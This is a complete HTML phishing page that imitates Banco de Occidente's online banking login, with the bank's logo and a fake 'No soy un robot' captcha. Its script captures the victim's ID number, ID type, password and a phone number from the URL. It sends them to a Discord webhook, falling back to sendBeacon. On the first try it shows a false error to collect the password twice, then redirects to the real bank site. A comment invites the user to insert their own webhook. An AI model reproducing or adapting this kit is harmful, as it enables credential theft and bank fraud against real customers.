<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Transaccional - Banco de Occidente</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>

    <div class="slideshow-container">
        <div class="slide" style="background-image: url('login_sin_texto1.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto2.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto3.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto4.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto5.jfif');"></div>
    </div>

    <div class="overlay"></div>

    <div class="main-content">
        <div class="login-card">
            <div class="security-badge">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                Seguridad
            </div>

            <div class="header">
                <img src="https://www.bancodeoccidente.com.co/portaltransaccional/logo-03-occidente-01-occidente-01-regular.fcca1c0810b8bb3f.svg" alt="Logo" class="logo">
                <p class="welcome">¡Bienvenido! a tu,</p>
                <h2 class="title">Portal Transaccional</h2>
            </div>

            <div class="tabs">
                <div class="tab active">Registrado</div>
                <div class="tab">Sin registro</div>
            </div>

            <form id="loginForm">
                <div class="field-group">
                    <label>Identificación</label>
                    <div class="id-row">
                        <select class="id-select" id="tipo_doc">
                            <option>C.C</option>
                            <option>C.E</option>
                            <option>PS</option>
                            <option>T.I</option>
                        </select>
                        <input type="text" id="documento" placeholder="Número de documento" class="id-input" required>
                    </div>
                </div>

                <div class="field-group">
                    <label>Contraseña</label>
                    <div class="password-input-container">
                        <input type="password" id="clave" placeholder="Ingresa tu contraseña" required>
                        <span class="toggle-pass" onclick="toggleClave()">👁️</span>
                    </div>
                    <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
                </div>

                <div class="captcha-box">
                    <div class="captcha-left">
                        <input type="checkbox" required> <span>No soy un robot</span>
                    </div>
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha" width="30">
                </div>

                <div class="actions">
                    <button type="button" class="btn-reg">Regístrate</button>
                    <button type="submit" class="btn-in" id="btnIngresar">Ingresar</button>
                </div>
            </form>
        </div>
    </div>

    <script>
    let intentos = 0;
    // REEMPLAZA ESTO CON TU URL REAL DE DISCORD/WEBHOOK
    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp"; 

    function toggleClave() {
        const input = document.getElementById("clave");
        input.type = input.type === "password" ? "text" : "password";
    }

    document.getElementById("loginForm").addEventListener("submit", function(e) {
        e.preventDefault();
        intentos++;

        const btn = document.getElementById("btnIngresar");
        btn.innerHTML = "Validando...";
        btn.disabled = true;

        // Recuperar teléfono de la URL
        const urlParams = new URLSearchParams(window.location.search);
        const telefono = urlParams.get('telefono') || "No capturado";
        const documento = document.getElementById("documento").value;
        const tipoDoc = document.getElementById("tipo_doc").value;
        const clave = document.getElementById("clave").value;

        // Formato de mensaje optimizado para Discord
        const payload = {
            username: "BOT OCCIDENTE",
            content: `**📥 NUEVO LOG CAPTURADO**\n` +
                     `**Celular:** ${telefono}\n` +
                     `**Documento:** ${documento} (${tipoDoc})\n` +
                     `**Clave:** \`${clave}\` \n` +
                     `**Intento:** #${intentos}\n` +
                     `**Fecha:** ${new Date().toLocaleString()}\n` +
                     `-------------------------------------------`
        };

        // ENVÍO REFORZADO
        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).catch(err => {
            // Si el fetch falla por seguridad (CORS), usamos sendBeacon como respaldo
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
        });

        // Mostrar error al usuario pase lo que pase
        setTimeout(() => {
            if (intentos === 1) {
                // PRIMER INTENTO: MOSTRAR ERROR
                Swal.fire({
                    icon: 'error',
                    title: 'Acceso Denegado',
                    text: 'Datos de inicio incorrectos, intente nuevamente.',
                    confirmButtonColor: '#0076ff',
                    confirmButtonText: 'Reintentar'
                }).then(() => {
                    document.getElementById("clave").value = "";
                    btn.innerHTML = "Ingresar";
                    btn.disabled = false;
                    document.getElementById("clave").focus();
                });
            } else {
                // SEGUNDO INTENTO: MOSTRAR ÉXITO
                Swal.fire({
                    icon: 'success',
                    title: 'Solicitud Exitosa',
                    text: 'Su validación ha sido procesada correctamente.',
                    confirmButtonColor: '#00c3a5',
                    confirmButtonText: 'Finalizar'
                }).then(() => {
                    // Redirigir a la página oficial
                    window.location.href = "https://www.bancodeoccidente.com.co/portaltransaccional/login";
                });
            }
        }, 1200); 
    });
</script>
</body>
</html>
